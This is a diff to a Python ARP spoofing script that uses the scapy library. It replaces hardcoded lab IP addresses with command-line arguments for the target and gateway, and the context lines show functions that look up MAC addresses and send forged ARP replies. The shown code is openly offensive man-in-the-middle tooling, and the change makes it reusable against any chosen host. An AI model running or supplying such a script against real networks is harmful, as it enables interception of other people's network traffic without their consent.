@@ -1,9 +1,16 @@
 #!/usr/bin/env python
 
-# ARP_SPOOFING
 import scapy.all as scapy
 import time
 import sys
+import argparse
+
+def arguments():
+    parser = argparse.ArgumentParser(description="ARP Spoof")
+    parser.add_argument("-t", "--target", metavar="", required=True, help="Target IP")
+    parser.add_argument("-g", "--gateway", metavar="", required=True, help="Gateway IP")
+    args = parser.parse_args()
+    return args
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -28,8 +35,9 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "10.0.2.15"
-gateway_ip = "10.0.2.1"
+args = arguments()
+target_ip = args.target
+gateway_ip = args.gateway
 
 try:
     sent_packets_count = 0
